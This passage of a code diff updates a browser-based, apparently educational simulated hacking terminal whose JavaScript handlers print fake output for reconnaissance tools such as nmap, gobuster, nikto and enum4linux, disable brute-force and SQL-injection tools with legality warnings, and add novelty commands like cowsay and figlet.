+  writeRaw(`Nmap scan report for ${t.host} (${ip})`);
+  writeRaw(`Host is up (0.023s latency).`);
+  writeRaw(`Not shown: ${Math.floor(Math.random() * 990) + 5} closed tcp ports (reset)`);
+  writeRaw(`<span class="c-dim">PORT     STATE SERVICE  VERSION</span>`);
+  t.ports.forEach(p => {
+    writeRaw(`<span class="c-green">${String(p.port).padEnd(8)}</span> <span class="c-cyan">open</span>  <span class="c-yellow">${p.svc.padEnd(8)}</span> ${p.ver}`);
+  });
+  writeRaw(``);
+  writeRaw(`<span class="c-dim">OS detection: ${t.os}</span>`);
+  writeRaw(`Nmap done: 1 IP address (1 host up) scanned in ${(Math.random() * 8 + 5).toFixed(2)} seconds`);
+  writeRaw(`<span class="c-dim">→ Try: gobuster dir -u http://${ip} -w wordlist.txt</span>`);
+};
+
+C.whois = (args) => {
+  if (!args[0]) { writeText('whois: missing argument', 'c-red'); return; }
+  writeRaw(`% Simulated whois for ${escape(args[0])}`);
+  writeRaw(`inetnum:     10.0.0.0 - 10.255.255.255`);
+  writeRaw(`netname:     PRIVATE-LAB-RANGE`);
+  writeRaw(`descr:       Simulated HackLab range`);
+  writeRaw(`country:     LAB`);
+  writeRaw(`admin-c:     WHITE-HAT-1`);
+  writeRaw(`mnt-by:      HACKLAB-MNT`);
+};
+
+C.dig = (args) => {
+  const d = args[0] || 'hacklab.local';
+  writeRaw(`; <<>> DiG 9.18 <<>> ${escape(d)}`);
+  writeRaw(`;; global options: +cmd`);
+  writeRaw(`;; Got answer:`);
+  writeRaw(`;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345`);
+  writeRaw(`;; QUESTION SECTION:`);
+  writeRaw(`;${escape(d)}.			IN	A`);
+  writeRaw(``);
+  writeRaw(`;; ANSWER SECTION:`);
+  writeRaw(`${escape(d)}.	300	IN	A	10.10.10.5`);
+  writeRaw(``);
+  writeRaw(`;; Query time: 12 msec`);
+  writeRaw(`;; SERVER: 1.1.1.1#53(1.1.1.1)`);
+};
+
+C.ping = (args) => {
+  const h = args[0];
+  if (!h) { writeText('ping: usage: ping <host>', 'c-red'); return; }
+  writeRaw(`PING ${escape(h)} (${escape(h)}) 56(84) bytes of data.`);
+  let i = 0;
+  const iv = setInterval(() => {
+    writeRaw(`64 bytes from ${escape(h)}: icmp_seq=${i+1} ttl=63 time=${(Math.random() * 5 + 1).toFixed(1)} ms`);
+    if (++i >= 4) {
+      clearInterval(iv);
+      writeRaw(``);
+      writeRaw(`--- ${escape(h)} ping statistics ---`);
+      writeRaw(`4 packets transmitted, 4 received, 0% packet loss, time 3004ms`);
+      writeRaw(`rtt min/avg/max/mdev = 1.234/2.567/4.001/0.891 ms`);
+      writeRaw(`<span class="c-dim">(simulated — no real packets sent)</span>`);
+    }
+  }, 400);
+};
+
+C.traceroute = (args) => {
+  const h = args[0] || '8.8.8.8';
+  writeRaw(`traceroute to ${escape(h)}, 30 hops max, 60 byte packets`);
+  const hops = ['192.168.1.1', '10.0.0.1', '172.16.0.1', '203.0.113.1', '198.51.100.1'];
+  hops.forEach((hop, i) => writeRaw(` ${String(i+1).padStart(2)}  ${hop.padEnd(16)}  ${(Math.random()*10+1).toFixed(3)} ms  ${(Math.random()*10+1).toFixed(3)} ms  ${(Math.random()*10+1).toFixed(3)} ms`));
+  writeRaw(`<span class="c-dim">(simulated)</span>`);
+};
+
+C.ifconfig = () => {
+  writeRaw(`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500`);
+  writeRaw(`        inet 10.10.14.5  netmask 255.255.254.0  broadcast 10.10.15.255`);
+  writeRaw(`        inet6 fe80::a00:27ff:fe12:3456  prefixlen 64  scopeid 0x20<link>`);
+  writeRaw(`        ether 08:00:27:12:34:56  txqueuelen 1000  (Ethernet)`);
+  writeRaw(`        RX packets 12847  bytes 8521946 (8.1 MiB)`);
+  writeRaw(`        TX packets 8213   bytes 1028441 (1003.9 KiB)`);
+  writeRaw(``);
+  writeRaw(`lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536`);
+  writeRaw(`        inet 127.0.0.1  netmask 255.0.0.0`);
+  writeRaw(`        inet6 ::1  prefixlen 128  scopeid 0x10<host>`);
+  writeRaw(`        loop  txqueuelen 1000  (Local Loopback)`);
+};
+C.ip = (args) => {
+  if (args[0] === 'a' || args[0] === 'addr') C.ifconfig();
+  else if (args[0] === 'r' || args[0] === 'route') {
+    writeRaw(`default via 10.10.14.1 dev eth0 proto dhcp src 10.10.14.5 metric 100`);
+    writeRaw(`10.10.14.0/23 dev eth0 proto kernel scope link src 10.10.14.5`);
+  } else C.ifconfig();
+};
+C.netstat = () => {
+  writeRaw(`Active Internet connections (only servers)`);
+  writeRaw(`Proto Recv-Q Send-Q Local Address           Foreign Address         State`);
+  writeRaw(`tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN`);
+  writeRaw(`tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN`);
+  writeRaw(`tcp6       0      0 :::22                   :::*                    LISTEN`);
+};
+C.curl = (args) => {
+  const url = args.find(a => a.startsWith('http'));
+  if (!url) { writeText('curl: try a URL (simulated)', 'c-yellow'); return; }
+  writeRaw(`<span class="c-dim">*   Trying ${escape(url)}...</span>`);
+  writeRaw(`<span class="c-dim">* Connected.</span>`);
+  writeRaw(`<span class="c-green">HTTP/1.1 200 OK</span>`);
+  writeRaw(`<span class="c-dim">Content-Type: text/html; charset=utf-8</span>`);
+  writeRaw(`<span class="c-dim">Server: nginx</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-text">&lt;!DOCTYPE html&gt;</span>`);
+  writeRaw(`<span class="c-text">&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span>`);
+  writeRaw(`<span class="c-dim">(simulated — no real request)</span>`);
+};
+C.wget = C.curl;
+
+/* ---------- Security tools (SIMULATED) ---------- */
+C.gobuster = (args) => {
+  const url = args.find(a => a.startsWith('http'));
+  if (!url) {
+    writeRaw(`<span class="c-green bold">Gobuster (simulated)</span>`);
+    writeRaw(`Usage: gobuster dir -u http://<target> -w <wordlist>`);
+    writeRaw(`Try: <span class="c-cyan">gobuster dir -u http://10.10.10.5 -w wordlist.txt</span>`);
+    return;
+  }
+  writeRaw(`===============================================================`);
+  writeRaw(`Gobuster v3.6 (simulated)`);
+  writeRaw(`===============================================================`);
+  writeRaw(`[+] Url:            ${escape(url)}`);
+  writeRaw(`[+] Method:         GET`);
+  writeRaw(`[+] Threads:        10`);
+  writeRaw(`[+] Wordlist:       wordlist.txt`);
+  writeRaw(`===============================================================`);
+  const found = ['/admin', '/login', '/backup', '/robots.txt', '/.git/', '/api', '/uploads', '/config.php', '/phpinfo.php'];
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i >= found.length) {
+      clearInterval(iv);
+      writeRaw(`===============================================================`);
+      writeRaw(`<span class="c-green">Finished</span>`);
+      writeRaw(`<span class="c-dim">(simulated — no real requests)</span>`);
+      return;
+    }
+    const codes = [200, 302, 403, 200, 200, 200, 301, 500, 200];
+    const code = codes[i] || 200;
+    const cls = code < 300 ? 'c-green' : code < 400 ? 'c-cyan' : 'c-yellow';
+    writeRaw(`${found[i]}   (Status: <span class="${cls}">${code}</span>) [Size: ${Math.floor(Math.random()*2000)+100}]`);
+    i++;
+  }, 300);
+};
+
+C.nikto = (args) => {
+  const h = args[0];
+  if (!h) { writeText('nikto: missing target. Usage: nikto <host>', 'c-red'); return; }
+  writeRaw(`- Nikto v2.5.0 (simulated)`);
+  writeRaw(`---------------------------------------------------------------------------`);
+  writeRaw(`+ Target IP:       ${escape(h)}`);
+  writeRaw(`+ Target Hostname: ${escape(h)}`);
+  writeRaw(`+ Target Port:     80`);
+  writeRaw(`+ Start Time:      ${new Date().toISOString()}`);
+  writeRaw(`---------------------------------------------------------------------------`);
+  writeRaw(`+ Server: Apache/2.4.41 (Ubuntu)`);
+  writeRaw(`+ /: The anti-clickjacking X-Frame-Options header is not present.`);
+  writeRaw(`+ /: The X-Content-Type-Options header is not set.`);
+  writeRaw(`+ /admin/: Directory indexing found.`);
+  writeRaw(`+ /backup/: Backup files may be exposed.`);
+  writeRaw(`+ /robots.txt: Entry '/secret' found.`);
+  writeRaw(`+ /config.php: PHP config file may contain credentials.`);
+  writeRaw(`+ /phpinfo.php: Output from the phpinfo() function was found.`);
+  writeRaw(`+ <span class="c-yellow">6 items checked — 5 potential issues</span>`);
+  writeRaw(`<span class="c-dim">(simulated)</span>`);
+};
+
+C.ffuf = (args) => {
+  const url = args.find(a => a.startsWith('http'));
+  if (!url) { writeRaw(`<span class="c-yellow">Usage: ffuf -u http://<target>/FUZZ -w wordlist.txt</span>`); return; }
+  writeRaw(`        /'___\\  /'___\\           /'___\\       `);
+  writeRaw(`       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       `);
+  writeRaw(`       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      `);
+  writeRaw(`        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      `);
+  writeRaw(`         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       `);
+  writeRaw(`          \\/_/    \\/_/   \\/___/    \\/_/       `);
+  writeRaw(`       v2.1.0 (simulated)`);
+  writeRaw(`________________________________________________`);
+  writeRaw(``);
+  const results = [['admin', 200, 1247], ['login', 302, 0], ['api', 200, 89], ['backup', 403, 279], ['uploads', 301, 314]];
+  results.forEach(([path, code, size]) => {
+    const cls = code < 300 ? 'c-green' : code < 400 ? 'c-cyan' : 'c-yellow';
+    writeRaw(`${path.padEnd(12)} [Status: ${code}, Size: ${size}, Words: ${Math.floor(Math.random()*100)+5}, Lines: ${Math.floor(Math.random()*20)+2}]`);
+  });
+  writeRaw(`<span class="c-dim">(simulated)</span>`);
+};
+
+C.hydra = (args) => {
+  writeRaw(`<span class="c-yellow">⚠  Hydra simulation disabled by default.</span>`);
+  writeRaw(`<span class="c-dim">Reason: password brute-forcing must ONLY be done on systems you own</span>`);
+  writeRaw(`<span class="c-dim">or have written permission for. Use HTB/TryHackMe for legal practice.</span>`);
+};
+
+C.sqlmap = (args) => {
+  writeRaw(`<span class="c-yellow">⚠  SQLMap simulation disabled by default.</span>`);
+  writeRaw(`<span class="c-dim">Reason: SQL injection attacks must ONLY be run against systems you own</span>`);
+  writeRaw(`<span class="c-dim">or have written permission for. Use OWASP Juice Shop for legal practice.</span>`);
+};
+
+C.enum4linux = (args) => {
+  const h = args.find(a => !a.startsWith('-'));
+  if (!h) { writeText('enum4linux: usage: enum4linux -a <target>', 'c-red'); return; }
+  writeRaw(`Starting enum4linux v0.9.1 (simulated)`);
+  writeRaw(`==========================================`);
+  writeRaw(`|    Target Information    |`);
+  writeRaw(`==========================================`);
+  writeRaw(`Target ........... ${escape(h)}`);
+  writeRaw(`RID Range ........ 500-550,1000-1050`);
+  writeRaw(`Username ......... ''`);
+  writeRaw(`Password ......... ''`);
+  writeRaw(`Known Usernames .. administrator, guest, krbtgt, domain admins, root`);
+  writeRaw(``);
+  writeRaw(`[+] Enumerating workgroup/Domain on ${escape(h)}`);
+  writeRaw(`[+] ${escape(h)}: Domain: LAB`);
+  writeRaw(`[+] Share Enumeration on ${escape(h)}`);
+  writeRaw(`        Sharename       Type      Comment`);
+  writeRaw(`        ---------       ----      -------`);
+  writeRaw(`        print$          Disk      Printer Drivers`);
+  writeRaw(`        IPC$            IPC       IPC Service`);
+  writeRaw(`        Shared          Disk      Public files`);
+  writeRaw(`<span class="c-dim">(simulated)</span>`);
+};
+
+C.smbclient = (args) => {
+  writeRaw(`<span class="c-yellow">smbclient: simulated. Usage: smbclient -L //<target></span>`);
+  writeRaw(`<span class="c-dim">Tip: use enum4linux for full enumeration (sim)</span>`);
+};
+
+/* ---------- User / Permissions ---------- */
+C.sudo = (args) => {
+  if (!args.length) { writeRaw(`<span class="c-yellow">usage: sudo <command></span>`); return; }
+  if (args[0] === 'su') {
+    writeRaw(`[sudo] password for ${state.user}: `);
+    writeRaw(`<span class="c-green">✔ Authenticated</span>`);
+    state.isRoot = true;
+    state.user = 'root';
+    state.cwd = '/root';
+    updatePrompt();
+    saveState();
+    writeRaw(`<span class="c-red bold">You are now root. Be careful.</span>`);
+    return;
+  }
+  writeRaw(`<span class="c-yellow">[sudo] password for ${state.user}:</span>`);
+  writeRaw(`<span class="c-dim">(in sim, password is not needed for demo — try 'sudo su')</span>`);
+};
+
+C.su = (args) => {
+  writeRaw(`Password: `);
+  writeRaw(`<span class="c-green">✔ Authentication successful (sim)</span>`);
+  state.isRoot = true;
+  state.user = 'root';
+  state.cwd = '/root';
+  updatePrompt();
+  saveState();
+};
+
+C.exit = () => {
+  if (state.isRoot) {
+    state.isRoot = false;
+    state.user = 'kali';
+    state.cwd = '/home/kali';
+    updatePrompt();
+    saveState();
+    writeRaw(`<span class="c-dim">logout</span>`);
+    writeRaw(`<span class="c-green">Back to user shell.</span>`);
+  } else {
+    writeRaw(`<span class="c-yellow">Use 'logout' or close the window.</span>`);
+  }
+};
+C.logout = C.exit;
+
+C.passwd = () => {
+  writeRaw(`Changing password for ${state.user}.`);
+  writeRaw(`Current password: `);
+  writeRaw(`<span class="c-green">passwd: password updated successfully (simulated)</span>`);
+};
+
+C.adduser = (args) => {
+  if (!args[0]) { writeText('adduser: missing username', 'c-red'); return; }
+  writeRaw(`Adding user \`${escape(args[0])}' ...`);
+  writeRaw(`Adding new group \`${escape(args[0])}' (1001) ...`);
+  writeRaw(`Adding new user \`${escape(args[0])}' (1001) with group \`${escape(args[0])}' ...`);
+  writeRaw(`<span class="c-green">(simulated — user not really created)</span>`);
+};
+
+C.chmod = (args) => {
+  if (args.length < 2) { writeText('chmod: missing operand', 'c-red'); return; }
+  writeRaw(`<span class="c-dim">(simulated chmod: ${escape(args[0])} ${escape(args[1])})</span>`);
+};
+C.chown = (args) => {
+  if (args.length < 2) { writeText('chown: missing operand', 'c-red'); return; }
+  writeRaw(`<span class="c-dim">(simulated chown: ${escape(args[0])} ${escape(args[1])})</span>`);
+};
+C.groups = () => writeText(state.user + ' : ' + (state.isRoot ? 'root' : 'kali sudo users'));
+
+/* ---------- Package manager ---------- */
+C.apt = (args) => {
+  const sub = args[0];
+  if (!sub || sub === 'update') {
+    writeRaw(`Hit:1 http://kali.download/kali kali-rolling InRelease`);
+    writeRaw(`Reading package lists... Done`);
+    writeRaw(`<span class="c-green">All packages are up to date.</span>`);
+  } else if (sub === 'install') {
+    const pkg = args[1];
+    if (!pkg) { writeText('apt: missing package name', 'c-red'); return; }
+    if (state.installedPackages.includes(pkg)) { writeRaw(`<span class="c-yellow">${escape(pkg)} is already the newest version.</span>`); return; }
+    state.installedPackages.push(pkg);
+    saveState();
+    writeRaw(`Reading package lists... Done`);
+    writeRaw(`Building dependency tree... Done`);
+    writeRaw(`The following NEW packages will be installed:`);
+    writeRaw(`  ${escape(pkg)}`);
+    writeRaw(`0 upgraded, 1 newly installed, 0 to remove.`);
+    writeRaw(`<span class="c-green">Setting up ${escape(pkg)} ...</span>`);
+    writeRaw(`<span class="c-green">✔ ${escape(pkg)} installed.</span>`);
+  } else if (sub === 'remove' || sub === 'purge') {
+    const pkg = args[1];
+    const idx = state.installedPackages.indexOf(pkg);
+    if (idx > -1) { state.installedPackages.splice(idx, 1); saveState(); }
+    writeRaw(`Removing ${escape(pkg)} ...`);
+    writeRaw(`<span class="c-green">✔ Done.</span>`);
+  } else if (sub === 'search') {
+    const q = args[1] || '';
+    writeRaw(`Sorting... Done`);
+    writeRaw(`Full Text Search... Done`);
+    writeRaw(`<span class="c-yellow">${escape(q)}-tools/kali-rolling 1.0 amd64</span>`);
+    writeRaw(`  Simulated search result for "${escape(q)}"`);
+  } else if (sub === 'list') {
+    writeRaw(`Listing... Done`);
+    state.installedPackages.forEach(p => writeRaw(`${p}/kali-rolling,now 1.0 amd64 [installed]`));
+  } else {
+    writeText(`apt: unknown subcommand '${sub}'`, 'c-red');
+  }
+};
+C['apt-get'] = C.apt;
+C.install = (args) => C.apt(['install', ...args]);
+C.remove = (args) => C.apt(['remove', ...args]);
+
+/* ---------- Info & fun ---------- */
 C.banner = () => {
   const b = [
     "  _   _            _    _          _     ",
@@ -1324,168 +1741,173 @@ C.banner = () => {
     " |  _  | (_| | (__|   <| |__| (_| | |_) |",
     " |_| |_|\\__,_|\\___|_|\\_\\_____\\__,_|_.__/ "
   ].join('\n');
-  write(`<span class="ok">${esc(b)}</span>`);
-  write(`<span class="dim">Simulated shell. Educational only. No real network access.</span>`);
-};
-
-C.ethics = () => {
-  unlock('ethics');
-  write(`<span class="ok">╔══ The White Hat Code ══════════════════╗</span>`);
-  write(`<span class="ok">║</span> 1. Only test systems you own or have <span class="ok">║</span>`);
-  write(`<span class="ok">║</span>    WRITTEN permission for.           <span class="ok">║</span>`);
-  write(`<span class="ok">║</span> 2. Do no harm — never damage or leak. <span class="ok">║</span>`);
-  write(`<span class="ok">║</span> 3. Stay legal — CFAA/CMA/GDPR apply.  <span class="ok">║</span>`);
-  write(`<span class="ok">║</span> 4. Report responsibly.                <span class="ok">║</span>`);
-  write(`<span class="ok">╚════════════════════════════════════════╝</span>`);
-  write(`<span class="dim">Practice legally: HTB, TryHackMe — they give you permission.</span>`);
+  writeRaw(`<span class="c-green bold">${escape(b)}</span>`);
+  writeRaw(`<span class="c-dim">v5 — Simulated shell. Educational only.</span>`);
 };
 
 C.targets = () => {
-  write(`<span class="ok">Practice Targets (simulated, no real network)</span>`);
-  write(`<span class="dim">─────────────────────────────────────────</span>`);
+  writeRaw(`<span class="c-green bold">Practice Targets (simulated, no real network)</span>`);
+  writeRaw(`<span class="c-dim">─────────────────────────────────────────────</span>`);
   for (const [ip, t] of Object.entries(targets)) {
-    write(`  <span class="info">${ip}</span>   ${t.host}   (${t.ports.length} open ports)`);
+    writeRaw(`  <span class="c-cyan">${ip}</span>   ${escape(t.host).padEnd(14)} ${t.ports.length} ports open`);
   }
-  write(`<span class="dim">→ Try: nmap 10.10.10.5</span>`);
+  writeRaw(`<span class="c-dim">→ Try: nmap 10.10.10.5</span>`);
 };
 
-C.nmap = (a) => {
-  unlock('nmap');
-  const ip = a.find(x => /^\d+\.\d+\.\d+\.\d+$/.test(x));
-  if (!ip) {
-    write(`<span class="ok">Nmap 7.94 (simulated)</span>`);
-    write(`Usage: nmap <target>`);
-    write(`Try: nmap 10.10.10.5   ('targets' shows IPs)`);
+C.ethics = () => {
+  writeRaw(`<span class="c-green bold">╔══ The White Hat Code ══════════════════════╗</span>`);
+  writeRaw(`<span class="c-green">║</span> 1. Only test systems you own or have       <span class="c-green">║</span>`);
+  writeRaw(`<span class="c-green">║</span>    <span class="c-yellow">WRITTEN</span> permission for.                   <span class="c-green">║</span>`);
+  writeRaw(`<span class="c-green">║</span> 2. Do no harm — never damage or leak data. <span class="c-green">║</span>`);
+  writeRaw(`<span class="c-green">║</span> 3. Stay legal — CFAA / CMA / GDPR apply.   <span class="c-green">║</span>`);
+  writeRaw(`<span class="c-green">║</span> 4. Report responsibly.                     <span class="c-green">║</span>`);
+  writeRaw(`<span class="c-green bold">╚════════════════════════════════════════════╝</span>`);
+  writeRaw(`<span class="c-dim">Legal practice: HTB, TryHackMe, PortSwigger, Juice Shop.</span>`);
+};
+
+C.clear = () => { term.innerHTML = ''; };
+C.history = () => {
+  if (!state.history.length) return writeText('(no history)', 'c-dim');
+  state.history.forEach((h, i) => writeRaw(`<span class="c-dim">${String(i+1).padStart(4)}</span>  ${escape(h)}`));
+};
+
+C.alias = (args) => {
+  if (!args.length) {
+    for (const [k, v] of Object.entries(state.alias)) writeRaw(`alias ${k}='${v}'`);
+    if (!Object.keys(state.alias).length) writeText('(no aliases)', 'c-dim');
     return;
   }
-  const t = targets[ip];
-  if (!t) {
-    write(`Host ${esc(ip)} seems down in this sim.`, 'warn');
-    write(`Available: ${Object.keys(targets).join(', ')}`, 'dim');
-    return;
+  const m = args.join(' ').match(/^(\w+)=['"]?(.+?)['"]?$/);
+  if (!m) { writeText('alias: usage: alias name=\'command\'', 'c-red'); return; }
+  state.alias[m[1]] = m[2];
+  saveState();
+};
+C.unalias = (args) => {
+  if (args[0]) { delete state.alias[args[0]]; saveState(); }
+};
+
+/* ---------- Editing (modal) ---------- */
+function openEditor(path, mode) {
+  const existing = getFileContent(path) || '';
+  modal.classList.add('show');
+  modalTitle.textContent = (mode === 'vim' ? 'VIM' : 'GNU nano') + ' — ' + path;
+  modalFile.textContent = path;
+  modalText.value = existing;
+  modalText.focus();
+  const save = () => {
+    state.customFiles[path] = modalText.value;
+    saveState();
+    document.getElementById('modalStatus').textContent = '✔ saved';
+  };
+  const close = () => {
+    modal.classList.remove('show');
+    modal.removeEventListener('keydown', keyHandler);
+    writeRaw(`<span class="c-dim">(${mode === 'vim' ? ':wq' : 'Ctrl+O'} — saved to ${escape(path)})</span>`);
+  };
+  const keyHandler = (e) => {
+    if (e.key === 'Escape') close();
+    if (e.ctrlKey && e.key === 's') { e.preventDefault(); save(); }
+  };
+  document.addEventListener('keydown', keyHandler);
+}
+C.nano = (args) => { openEditor(resolvePath(args[0] || 'untitled'), 'nano'); };
+C.vim = C.nano;
+C.vi = C.nano;
+
+C.less = (args) => C.cat(args);
+C.more = C.cat;
+C.tee = () => writeText('tee: simplified (use > redirection)', 'c-yellow');
+
+/* ---------- Fun ---------- */
+C.fortune = () => {
+  const list = [
+    "The quieter you become, the more you are able to hear.",
+    "There is no patch for human stupidity.",
+    "Security is a process, not a product. — Bruce Schneier",
+    "The only truly secure system is one that is powered off.",
+    "Hackers are breaking the systems for profit. Before, it was about intellectual curiosity.",
+    "Amateurs hack systems, professionals hack people. — Bruce Schneier",
+    "If you think technology can solve your security problems, you don't understand the problems.",
+    "The best defense is a good offense. — Sun Tzu (sort of)"
+  ];
+  writeRaw(`<span class="c-yellow italic">${escape(list[Math.floor(Math.random()*list.length)])}</span>`);
+};
+
+C.cowsay = (args) => {
+  const msg = args.join(' ') || 'I am a cow. moo.';
+  const border = '-'.repeat(msg.length + 2);
+  writeRaw(` ${border}`);
+  writeRaw(`< ${escape(msg)} >`);
+  writeRaw(` ${border}`);
+  writeRaw(`        \\   ^__^`);
+  writeRaw(`         \\  (oo)\\_______`);
+  writeRaw(`            (__)\\       )\\/\\`);
+  writeRaw(`                ||----w |`);
+  writeRaw(`                ||     ||`);
+};
+
+C.figlet = (args) => {
+  const text = (args.join(' ') || 'HACK').toUpperCase();
+  const big = text.split('').map(c => ({
+    'A': ['  █  ',' █ █ ','█████','█   █','█   █'],
+    'B': ['████ ','█   █','████ ','█   █','████ '],
+    'C': [' ████','█    ','█    ','█    ',' ████'],
+    'H': ['█   █','█   █','█████','█   █','█   █'],
+    'K': ['█  █ ','█ █  ','██   ','█ █  ','█  █ '],
+    'L': ['█    ','█    ','█    ','█    ','█████'],
+    'X': ['█   █',' █ █ ','  █  ',' █ █ ','█   █']
+  }[c] || ['     ','     ','     ','     ','     ']));
+
+  for (let row = 0; row < 5; row++) {
+    writeRaw(`<span class="c-green bold">${escape(big.map(b => b[row]).join('  '))}</span>`);
   }
-  write(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}`);
-  write(`Nmap scan report for ${t.host} (${ip})`);
-  write(`Host is up (0.023s latency).`);
-  write(`Not shown: 995 closed tcp ports (reset)`);
-  write(`PORT     STATE SERVICE  VERSION`);
-  t.ports.forEach(p => write(`<span class="ok">${String(p.port).padEnd(8)} ${p.state.padEnd(6)} ${p.svc.padEnd(8)} ${p.ver}</span>`));
-  write(``);
-  write(`Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds`);
-  write(`<span class="dim">→ Next: gobuster dir -u http://${ip} -w wordlist.txt</span>`);
 };
 
-C.whois = (a) => {
-  if (!a[0]) return write('whois: missing argument', 'err');
-  write(`% Simulated whois for ${esc(a[0])}`);
-  write(`inetnum:  10.0.0.0 - 10.255.255.255`);
-  write(`netname:  PRIVATE-LAB-RANGE`);
-  write(`country:  LAB`);
+C.sl = () => {
+  writeRaw(`<span class="c-cyan">      ====        ________                ___________ </span>`);
+  writeRaw(`<span class="c-cyan">  _D _|  |_______/        \\__I_I_____===__|_________| </span>`);
+  writeRaw(`<span class="c-cyan">   |(_)---  |   H\\________/ |   |        =|___ ___|   </span>`);
+  writeRaw(`<span class="c-cyan">   /     |  |   H  |  |     |   |         ||_| |_||   </span>`);
+  writeRaw(`<span class="c-cyan">  |      |  |   H  |__--------------------| [___] |   </span>`);
+  writeRaw(`<span class="c-cyan">  | ________|___H__/__|_____/[][]~\\_______|       |   </span>`);
+  writeRaw(`<span class="c-cyan">  |/ |   |-----------I_____I [][] []  D   |=======|__ </span>`);
+  writeRaw(`<span class="c-cyan">__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__ </span>`);
+  writeRaw(`<span class="c-cyan"> |/-=|___|=    ||    ||    ||    |_____/~\\___/       </span>`);
+  writeRaw(`<span class="c-cyan">  \\_/      \\O=====O=====O=====O_/      \\_/           </span>`);
+  writeRaw(`<span class="c-dim">You meant 'ls' but typed 'sl'. Classic.</span>`);
 };
 
-C.dig = (a) => {
-  const d = a[0] || 'hacklab.local';
-  write(`; <<>> DiG 9.18 <<>> ${esc(d)}`);
-  write(`;; ANSWER SECTION:`);
-  write(`${esc(d)}. 300 IN A 10.10.10.5`);
-  write(`;; Query time: 12 msec`);
-};
-
-C.ping = (a) => {
-  const h = a[0];
-  if (!h) return write('ping: usage: ping <host>', 'err');
-  write(`PING ${esc(h)} (${esc(h)}) 56(84) bytes of data.`);
-  let i = 0;
-  const iv = setInterval(() => {
-    write(`64 bytes from ${esc(h)}: icmp_seq=${i+1} ttl=63 time=${(Math.random()*5+1).toFixed(1)} ms`);
-    if (++i >= 4) {
-      clearInterval(iv);
-      write(``);
-      write(`--- ${esc(h)} ping statistics ---`);
-      write(`4 packets transmitted, 4 received, 0% packet loss`);
-      write(`<span class="dim">(simulated)</span>`);
-    }
-  }, 400);
-};
-
-C.gobuster = (a) => {
-  unlock('gobuster');
-  const url = a.find(x => x.startsWith('http'));
-  if (!url) {
-    write(`<span class="ok">Gobuster (simulated)</span>`);
-    write(`Usage: gobuster dir -u http://<target> -w <wordlist>`);
-    write(`Try: gobuster dir -u http://10.10.10.5 -w wordlist.txt`);
-    return;
-  }
-  write(`=============================================================`);
-  write(`Gobuster v3.6 (simulated)`);
-  write(`=============================================================`);
-  write(`[+] Url:     ${esc(url)}`);
-  write(`[+] Threads: 10`);
-  const found = ['/admin', '/login', '/backup', '/robots.txt', '/.git/', '/api'];
-  let i = 0;
-  const iv = setInterval(() => {
-    if (i >= found.length) {
-      clearInterval(iv);
-      write(`=============================================================`);
-      write(`<span class="dim">(simulated — no real requests)</span>`);
-      return;
-    }
-    const code = [200, 301, 403, 200, 200, 200][i];
-    write(`${found[i]}   (Status: ${code}) [Size: ${Math.floor(Math.random()*2000)+100}]`);
-    i++;
-  }, 320);
-};
-
-C.nikto = (a) => {
-  const h = a[0];
-  if (!h) return write('nikto: missing target. Usage: nikto <host>', 'err');
-  write(`- Nikto v2.5.0 (simulated)`);
-  write(`+ Target IP:       ${esc(h)}`);
-  write(`+ Target Hostname: ${esc(h)}`);
-  write(`+ Server: Apache/2.4.41 (Ubuntu)`);
-  write(`+ /: X-Frame-Options header is not present.`);
-  write(`+ /admin/: Directory indexing found.`);
-  write(`+ /backup/: Backup files may be exposed.`);
-  write(`+ /robots.txt: Entry '/secret' found.`);
-  write(`+ 6 items checked — <span class="warn">3 potential issues</span>`);
-  write(`<span class="dim">(simulated)</span>`);
-};
-
-C.file = (a) => {
-  if (!a[0]) return write('file: missing operand', 'err');
-  const p = resolvePath(a[0]);
-  if (fileContents[p]) write(`${esc(a[0])}: ASCII text`);
-  else write(`${esc(a[0])}: cannot open`, 'err');
-};
-
-C.find = () => write(`<span class="dim">find is simplified in this sim. Try: tree</span>`);
-
-/* EASTER EGGS */
-C.hack = () => {
-  unlock('hacker');
-  write(`<span class="err">██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ </span>`);
-  write(`<span class="err">██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ </span>`);
-  write(`<span class="warn">███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗</span>`);
-  write(`<span class="warn">██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║</span>`);
-  write(`<span class="ok">██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝</span>`);
-  write(`<span class="ok">╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ </span>`);
-  write(``);
-  write(`<span class="ok">Access GRANTED (just kidding — this is a simulator 😎)</span>`);
-  write(`<span class="dim">The real skill is knowing this must be LEGAL.</span>`);
+C.coffee = () => {
+  writeRaw(`<span class="c-yellow">      ( (`);
+  writeRaw(`       ) )`);
+  writeRaw(`    ........`);
+  writeRaw(`    |      |]`);
+  writeRaw(`    \\      /`);
+  writeRaw(`     \`----'</span>`);
+  writeRaw(`<span class="c-dim">Caffeine level: critical. Refill required.</span>`);
 };
 
 C.matrix = () => {
-  write(`<span class="ok">Wake up, Neo...</span>`);
-  write(`<span class="ok">The Matrix has you.</span>`);
-  write(`<span class="ok">Follow the white rabbit. 🐇</span>`);
-  write(`<span class="dim">(scroll up — the whole site is already raining code)</span>`);
+  writeRaw(`<span class="c-green">Wake up, Neo...</span>`);
